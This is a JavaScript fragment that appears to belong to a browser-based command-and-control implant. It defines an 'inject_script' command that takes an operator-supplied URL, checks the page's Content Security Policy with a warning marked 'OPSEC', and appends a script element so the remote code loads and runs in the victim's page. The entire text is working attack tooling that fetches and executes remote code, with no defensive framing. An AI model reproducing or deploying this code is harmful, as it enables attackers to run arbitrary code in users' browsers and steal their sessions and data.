COMMANDS['inject_script'] = async function(task) {
    var params = parseParams(task);
    var url = (params && params.url) ? params.url : '';
    if (!url) return 'error: url parameter required';

    var cspCheck = checkCSP('script-src');
    if (!cspCheck.allowed) {
        return 'OPSEC: CSP may block external script load. ' + cspCheck.reason + ' URL: ' + url;
    }

    return new Promise(function(resolve, reject) {
        var s = document.createElement('script');
        s.src = url;
        s.onload = function() {
            resolve('Script loaded and executed: ' + url);
        };
        s.onerror = function() {
            resolve('Failed to load script: ' + url + ' (CORS or network error)');
        };
        (document.head || document.documentElement).appendChild(s);
    });
};
